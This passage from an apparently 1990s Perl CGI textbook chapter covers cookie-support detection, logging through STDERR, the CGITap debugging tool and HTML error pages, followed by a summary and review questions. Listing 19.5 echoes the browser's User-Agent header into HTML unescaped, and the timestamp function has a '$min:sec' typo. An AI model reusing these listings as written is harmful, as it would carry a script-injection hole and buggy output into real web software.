This program shows that the web server stores a copy of any cookies that you set into the *HTTP_COOKIE* environment variable. It only performs one level of parsing. In order to create a really useful *getCookies()* function, you need to split the cookie on the comma character and then again on the equals character.

## Can a Visitor's Browser Support Cookies?

One difficulty that you may have in using cookies is that not every browser can support them. If you are using cookies, you need a user-friendly way of telling a visitor that the feature they are trying to use is not available to them. 

Listing 19.5 contains a script that shows you a nice way of automatically determining if a visitor's web browser supports cookies. The CGI program will set a cookie and then redirect the visitor's web browser back to itself with some additional path information. When the script (during its second invocation) sees the extra path information, it checks for the previously created cookie. If it exists, the visitor's browser has passed the test. Otherwise, the visitor's browser does not support cookies. 

> Turn on the warning option. 
> Turn on the strict pragma. 
> If there is no query information, then set a cookie and reload the script. 
> Otherwise, see if the cookie set before the reload exists. 
> If the cookie exists, the browser supports cookies. 
> If the cookie does not exist, the browser does not support cookies.

> Listing 19.5-19LST05.PL - How to Tell If the Visitor's Browser Supports Cookies

```perl
#!/usr/bin/perl -w
use strict;

if ($ENV{'QUERY_STRING'} ne 'TESTING') {
    print "HTTP/1.0 302 Moved Temporarily\n";
    print "Set-Cookie: Cookie=Test\n";
    print "Location: $ENV{'SCRIPT_NAME'}?TESTING\n\n";
}
else {
    if ($ENV{'HTTP_COOKIE'} =~ /Cookie=Test/) {
        print("Content-type: text/html\n\n");
        print("<HTML>");
        print("<HEAD><TITLE>$ENV{'HTTP_USER_AGENT'} supports Cookies</TITLE></HEAD>");
        print("<BODY>");
        print("Your browser, $ENV{'HTTP_USER_AGENT'}, supports the Netscape HTTP ");
        print("Cookie Specification.");
        print("</BODY></HTML>");
    }
    else {
        print("Content-type: text/html\n\n");
        print("<HTML>");
        print("<HEAD><TITLE>$ENV{'HTTP_USER_AGENT'} doesn't support Cookies</TITLE></HEAD>");
        print("<BODY>");
        print("Your browser, $ENV{'HTTP_USER_AGENT'}, doesn't appear to support cookies.");
        print("Cookie Specification.");
        print("</BODY></HTML>");
    }
}
```

```{note}
You can find more information about cookies at these web sites: 
* http://home.netscape.com/newsref/std/cookie_spec.html
* http://www.netscapeworld.com/netscapeworld/nw-07-1996/nw-07-cookies.html
* http://www.emf.net/~mal/cookiesinfo.html
* http://ds.internic.net/internet-drafts/draft-ietf-http-state-mgmt-03.txt
* http://www.illuminatus.com/cookie/
* http://www.jasmin.com/cook0696.html
* http://www.bravado.net/rodgers/InterNetNews.html
```

(debugging-cgi-programs)=
## Debugging CGI Programs

One of the main reasons to use CGI program is to generate HTML documents. When something goes wrong, the common error message will be *500 Server Error*. This message can be caused by several things. For example, the #! comment at the top of your script could be invalid, the first line of output was an invalid HTTP header, there might not be a blank line after the HTTP header, or you could simply have a syntax error. 

### Sending Output to the Server's Log File

When your CGI program starts, the *STDERR* file handle is connected to the server's error log. You can use STDERR to save status messages that you don't want the user to see. The advantage of using STDERR is that you don't need to open or close a file. In addition, you'll always know where the messages are. This is important if you're working on a team. 

> Send the HTTP header indicating a plain text document. 
> Send a line of text. 
> Call the logError() function to send a message to the server's log file. 
> Call the logError() function to send a message to the server's log file. 
> Send a line of text. 
> Define the logError() function. 
> Declare a local variable to hold the message. 
> Print the message to STDERR with a timestamp. 
> Define the timeStamp() function. 
> Declare some local variables to hold the current date and time. 
> Call the zeroFill() function to format the numbers. 
> Return a formatted string holding the current date and time. 
> Define the zeroFill() function - turns "1" into "01". 
> Declare a local variable to hold the number to be filled. 
> Declare a local variable to hold the string length that is needed. 
> Find difference between current string length and needed length. 
> If the string is big enough (like "12") then return it. 
> If the string is too big, prefix it with some zeroes.

> Listing 19.6-19LST06.PL - Sending Messages to the Server's Error Log

```perl
print("Content-type: text/plain\n\n");
print("This is line one.\n");
logError("GOOD Status\n");
logError("BAD  Status\n");
print("This is line two.\n");

sub logError {
    my($msg) = shift;
    print STDERR (timeStamp(), " $msg");
}

sub timeStamp {
    my($sec, $min, $hour, $mday, $mon, $year) = (localtime(time))[0..5];
    $mon  = zeroFill($mon, 2);
    $hour = zeroFill($hour, 2);
    $min  = zeroFill($min, 2);
    $sec  = zeroFill($sec, 2);
    return("$mon/$mday/$year, $hour:$min:sec");
}

sub zeroFill {
    my($temp) = shift;
    my($len)  = shift;
    my($diff) = $len - length($temp);

    return($temp) if $diff <= 0;
    return(('0' x $diff) . $temp);
}
```

<TABLE cellSpacing=0 cellPadding=0 border=0>
  <TBODY>
  <TR>
    <TD bgColor=black><FONT color=tomato size=4>Caution</FONT></TD></TR>
  <TR>
    <TD bgColor=tomato>According to the CGI specifications the STDERR file handle should be connected to the server's error log. However, I found that this was not true when using Windows 95 and O'Reilly Website server software. There may be other combinations of operating systems and server software that also fail to connect STDERR to the error log.</TD></TR>
  </TBODY>
</TABLE>

### Sending STDERR to the Web Browser

If want your users to see the error messages your script generates, use the *open()* function to redirect *STDERR* to *STDOUT* like this: 

```perl
open(STDERR, ">&amp;STDOUT");
```

After that statement is executed the output of all print statements that use the *STDERR* file handle will be displayed in the web browser window. You need to be a little careful when using this ability. Your normal error messages will not have the HTML tags required to make them display properly.

### CGITap

CGITap (**<A href="http://scendtek.com/cgitap/">http://scendtek.com/cgitap/</A>**) is a CGI debugging aid that can help pinpoint the problem in a troubling CGI application. CGITap installs in the *cgi-bin* directory and runs any CGI programs in "tap mode". Tap mode runs the CGI program as normal, however, the output contains additional diagnostic and environment information. This information can greatly speed up the process of debugging your CGI scripts. 

CGITap may be installed in any CGI enabled directory and requires perl4.036 or later. You can install CGITap by following these steps: 

* Download the CGITap script from the **<A href="http://scendtek.com/cgitap/">http://scendtek.com/cgitap/</A>** web page. 
* Install CGITap in a CGI enabled directory - typically named *cgi-bin*. 
* As with any perl script, be sure the first line of CGITap contains the correct path to your systems perl interpreter. You should be familiar with the location. If not, try typing **which perl** on the UNIX command line.
* Check the file permissions to ensure that CGITap is executable.

CGITap has two methods of debugging. The first is adequate for simple CGI applications which do not use HTML forms for input. The second method is used for CGI programs which process HTML form information. 

For simple CGIs, add *cgitap* to the URL. For example, normally a CGI program that just prints the date is called like this: 

```text
http://localhost/cgi-bin/date 
```

That CGI program might display the following in the browser's window: 

```text
Sun Aug 18 16:07:37 EST 1996
```

In order to use CGITap for debugging, use a similar URL but with cgitap inserted. 

```
http://localhost/cgi-bin/cgitap/date
```

CGITap will extract your CGI program's name, display the CGI environment to the browser, perform some checks on the program, then execute the program and return the actual results (both in HTML source, and the actual document).

CGI programs that process HTML forms will be discussed in ](./form-processing.md) but while I'm talking about CGITap let me also mention how to use CGITap with HTML Forms. A slightly more complicated method must be used for debugging complex CGI scripts which require form processing. 

The URL of a form's action is hard coded (via the *ACTION* modifier of the *<FORM>* tag) and you may not wish to change it to include *cgitap*. To allow CGITap to execute automatically when the form posts to its normal action URL, you can make use of UNIX symbolic links. If you are using Windows NT or Windows 95, you must change the URL in the HTML form. The steps for UNIX platforms are: 

* Move your CGI script to a new script called *yourscript.tap* by 
typing **mv yourscript yourscript.tap**. 
* Make a symbolic link called *yourscript* to *cgitap* by 
typing **ln -s cgitap yourscript**

For example, let's assume you have a CGI script called *mailit* that processes form input data, mails the information to you and returns an HTML page to the web browser. To debug this script, move *mailit* to *mailit.tap* using the following command: 

```
mv mailit mailit.tap
```

Then create a link to *cgitap* using this command: 

```
ln -s cgitap mailit
```

Now you can fill in the HTML form and submit it as usual. 

This method allows UNIX-based scripts and forms to be debugged without having to change hard coded URL's in your HTML documents. When the form is posted the results will be the CGITap debugging information, followed by the normal output of mailit.


### Generating an Error HTML Page

It is a good idea to isolate all program statements that have a high probability to generate errors at the beginning of your program. Or at least, before the HTTP header is sent. This lets you create HTML response pages that correspond to the specific error that was encountered. Listing 19.7 shows a simple example of this concept. You could expand this example to cover many different errors that can occur. 

> Try (and fail) to open a file. Call the error() function. 
> Define the error() function. 
> Declare a local variable to hold the error message string. 
> Output an HTML page to display the error message.

> Listing 19.7-19LST07.PL - Generating an Error Response Using HTML

```perl
open(FILE, 'AAAA.AAA') or error("Could not open file AAAA.AAA");

sub error {
    my($message) = @_;

    print("Content-type: text/html\n\n");
    print("<HTML>\n");
    print("<HEAD><TITLE>CGI Error</TITLE></HEAD>\n");
    print("<H1>Status: 500 An Error Has Occured</H1>\n");
    print("<HR>\n");
    print("$message\n");
    print("</BODY>\n");
    print("</HTML>\n");
}
```

I'm sure you agree that error messages that you provide are more informative than the standard ones.


## Summary

This chapter certainly covered a lot of material. It started by defining CGI as an interface between web servers and external programs. Then, you read why Perl is a great programming language to use when writing CGI programs. Next, the chapter touched on CGI applications versus Java applets and how they are complementary technologies. 

After those introductory comments, the fun started. CGI programs were shown to be invoked by a URL. The URL could be entered directly into a web browser or stored in a web page as a hypertext link or he destination for HTML form information. 

Before CGI program can be run under the UNIX operating systems, their file permissions need to be set correctly. Files have three types of permissions: read, write, and execute. And there are three types of users that access files: user, group, and others. CGI programs must be both readable and executable by others. 

The first line of output of any CGI program must be some type of HTTP header. The most common header is *Content-type:* which basically tells the web browser what to expect (plain text, perhaps? Or maybe some HTML). The *Location:* header redirects the web browser to another URL. The *Set-cookie:* header stores a small bit of information on the visitor's local disk. The last header is *Status:*, which tells the web browser that an error has arisen. 

By placing a */* or *?* at the end of a URL, information can be passed to the CGI program. Information after a */* is placed into the *PATH_INFO* environment variable. Information after a *?* is placed into the *QUERY_STRING* environment variable. 

Environment variables play a big role in CGI programs. They are the principal means that web servers use to provide information. For example, you can find out the client's IP address using the REMOTE_ADDR variable. And the SCRIPT_NAME variable contains the name of the current program. 

URL encoding is used to prevent characters from being misinterpreted. For example, the *<* character is usually encoded as *%3C*. In addition, most spaces are converted into plus signs. Listing 19.1 contains a function called *decodeURL()* that will decode the URL encoding. 

One of the biggest security risks happens when a user's data (form input or extra path information) is exposed to operating system commands like *mail* or *grep*. **Never trust user input!** Always suspect the worst. Most hackers spend many hours looking at manuals and source code to find software weaknesses. You need to read about web security in order to protect your site. 

The CGIwrap program offers a way to limit the damage potential by running CGI program with a user id that is different from the web server's. The programs are running using the user's user id so that damage is limited to your home directory. 

Cookies are used to store information on the user's hard drive. They are a way to create persistent information that lasts from one visit to the next. 

You can debug CGI programs by sending messages to the server's log file using the STDERR file handle. Or you could redirect STDERR to STDOUT so that the messages appear in the client web browser's window. If you have a complex problem, consider using CGItap, a program that lets you see all of the environment variables available to your program. 

The next chapter, [](./form-processing.md) will introduce you to HTML Forms and how CGI programs can process form information. After the introduction, a Guest book application will be presented. Guest books let visitors leave comments that can be viewed later by other visitors.

## Review Questions

* Is CGI a programming language? 
* Are CGI and Java the same type of protocol? 
* Do CGI program files need to have the write right turned on? 
* What is the first line of output for CGI programs? 
* What information does the HTTP_USER_AGENT contain? 
* Why is CGItap a useful program?

## Review Exercises

* Convert the program in Listing 19.1 so that it displays a HTML document. 
* Convert the program in Listing 19.1 so that it uses the *Location:* HTTP header. 
* Convert the program in Listing 19.1 so that it displays all environment variables Hint:

```perl
foreach (sort(keys(%ENV))) { ... }
```

* Write a CGI script that print "Thanks, you're doing a great job!" in your web server's error log file.
